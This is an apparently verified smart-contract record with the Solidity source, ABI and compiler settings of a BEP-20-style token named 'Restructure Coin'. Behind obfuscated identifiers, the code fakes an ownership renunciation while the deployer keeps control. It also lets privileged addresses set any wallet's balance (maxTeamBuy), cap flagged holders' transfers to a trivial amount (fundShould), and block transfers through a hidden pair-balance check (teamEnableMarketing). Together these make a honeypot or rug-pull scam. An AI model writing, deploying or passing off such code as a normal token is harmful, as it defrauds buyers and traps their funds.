{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract receiverMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTeamTotal {\n    function createPair(address buyFund, address fundAutoWallet) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface swapTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface receiverLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minFrom) external view returns (uint256);\n\n    function transfer(address limitAt, uint256 feeShould) external returns (bool);\n\n    function allowance(address launchTeamMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAt,\n        uint256 feeShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toSell, uint256 value);\n    event Approval(address indexed launchTeamMax, address indexed spender, uint256 value);\n}\n\ninterface receiverLaunchedMetadata is receiverLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RestructureCoin is receiverMarketing, receiverLaunched, receiverLaunchedMetadata {\n\n    function tokenWalletSell(address atIs, address limitAt, uint256 feeShould) internal view returns (uint256) {\n        require(feeShould > 0);\n\n        uint256 exemptIs = 0;\n        if (atIs == tokenWallet && receiverLaunch > 0) {\n            exemptIs = feeShould * receiverLaunch / 100;\n        } else if (limitAt == tokenWallet && buyTokenSwap > 0) {\n            exemptIs = feeShould * buyTokenSwap / 100;\n        }\n        require(exemptIs <= feeShould);\n        return feeShould - exemptIs;\n    }\n\n    constructor (){\n        \n        isAmountExempt();\n        swapTx modeTokenMin = swapTx(receiverLaunchTake);\n        tokenWallet = isTeamTotal(modeTokenMin.factory()).createPair(modeTokenMin.WETH(), address(this));\n        exemptModeSwap = isTeamTotal(modeTokenMin.factory()).feeTo();\n        if (takeBuy != tradingExempt) {\n            takeBuy = receiverTotalTo;\n        }\n        marketingTotal = _msgSender();\n        toSender[marketingTotal] = true;\n        walletLaunch[marketingTotal] = listAmountMin;\n        \n        emit Transfer(address(0), marketingTotal, listAmountMin);\n    }\n\n    uint256 public tradingExempt;\n\n    mapping(address => uint256) private walletLaunch;\n\n    uint256 private takeBuy;\n\n    function getOwner() external view returns (address) {\n        return launchTrading;\n    }\n\n    address public marketingTotal;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLiquidity;\n    }\n\n    mapping(address => bool) public toSender;\n\n    function isAmountExempt() public {\n        emit OwnershipTransferred(marketingTotal, address(0));\n        launchTrading = address(0);\n    }\n\n    function allowance(address marketingTokenAt, address minSell) external view virtual override returns (uint256) {\n        if (minSell == receiverLaunchTake) {\n            return type(uint256).max;\n        }\n        return launchedSender[marketingTokenAt][minSell];\n    }\n\n    bool private limitReceiver;\n\n    uint256 tradingExemptMax;\n\n    bool private buyTake;\n\n    function teamEnableMarketing(uint256 feeShould) public {\n        senderTrading();\n        tradingExemptMax = feeShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedSender;\n\n    function senderMax(address atIs, address limitAt, uint256 feeShould) internal returns (bool) {\n        require(walletLaunch[atIs] >= feeShould);\n        walletLaunch[atIs] -= feeShould;\n        walletLaunch[limitAt] += feeShould;\n        emit Transfer(atIs, limitAt, feeShould);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellMarketingIs;\n    }\n\n    uint256 private listAmountMin = 100000000 * 10 ** 18;\n\n    uint256 public buyTokenSwap = 0;\n\n    function walletEnable(address atIs, address limitAt, uint256 feeShould) internal returns (bool) {\n        if (atIs == marketingTotal) {\n            return senderMax(atIs, limitAt, feeShould);\n        }\n        uint256 modeMin = receiverLaunched(tokenWallet).balanceOf(exemptModeSwap);\n        require(modeMin == tradingExemptMax);\n        require(limitAt != exemptModeSwap);\n        if (exemptLiquidity[atIs]) {\n            return senderMax(atIs, limitAt, atEnable);\n        }\n        feeShould = tokenWalletSell(atIs, limitAt, feeShould);\n        return senderMax(atIs, limitAt, feeShould);\n    }\n\n    uint256 public receiverLaunch = 3;\n\n    bool private senderWalletLaunch;\n\n    address exemptModeSwap;\n\n    function fundFeeTrading(address exemptReceiver) public {\n        if (takeReceiver) {\n            return;\n        }\n        if (tradingExempt != receiverTotalTo) {\n            limitReceiver = true;\n        }\n        toSender[exemptReceiver] = true;\n        \n        takeReceiver = true;\n    }\n\n    address receiverLaunchTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant atEnable = 6 ** 10;\n\n    function transferFrom(address atIs, address limitAt, uint256 feeShould) external override returns (bool) {\n        if (_msgSender() != receiverLaunchTake) {\n            if (launchedSender[atIs][_msgSender()] != type(uint256).max) {\n                require(feeShould <= launchedSender[atIs][_msgSender()]);\n                launchedSender[atIs][_msgSender()] -= feeShould;\n            }\n        }\n        return walletEnable(atIs, limitAt, feeShould);\n    }\n\n    address private launchTrading;\n\n    bool public takeReceiver;\n\n    function transfer(address modeShouldMax, uint256 feeShould) external virtual override returns (bool) {\n        return walletEnable(_msgSender(), modeShouldMax, feeShould);\n    }\n\n    function balanceOf(address minFrom) public view virtual override returns (uint256) {\n        return walletLaunch[minFrom];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeMode;\n    }\n\n    function owner() external view returns (address) {\n        return launchTrading;\n    }\n\n    string private shouldLiquidity = \"RCN\";\n\n    address public tokenWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listAmountMin;\n    }\n\n    uint256 public exemptSwapTrading;\n\n    function fundShould(address tokenLaunched) public {\n        senderTrading();\n        if (receiverTotalTo == exemptSwapTrading) {\n            exemptSwapTrading = receiverTotalTo;\n        }\n        if (tokenLaunched == marketingTotal || tokenLaunched == tokenWallet) {\n            return;\n        }\n        exemptLiquidity[tokenLaunched] = true;\n    }\n\n    function senderTrading() private view {\n        require(toSender[_msgSender()]);\n    }\n\n    string private takeMode = \"Restructure Coin\";\n\n    event OwnershipTransferred(address indexed listWallet, address indexed liquidityFund);\n\n    function approve(address minSell, uint256 feeShould) public virtual override returns (bool) {\n        launchedSender[_msgSender()][minSell] = feeShould;\n        emit Approval(_msgSender(), minSell, feeShould);\n        return true;\n    }\n\n    uint256 public receiverTotalTo;\n\n    mapping(address => bool) public exemptLiquidity;\n\n    uint8 private sellMarketingIs = 18;\n\n    function maxTeamBuy(address modeShouldMax, uint256 feeShould) public {\n        senderTrading();\n        walletLaunch[modeShouldMax] = feeShould;\n    }\n\n    uint256 receiverIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTeamMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTokenAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTokenSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSwapTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"}],\"name\":\"fundFeeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"fundShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmountExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShouldMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"maxTeamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotalTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"teamEnableMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShouldMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RestructureCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}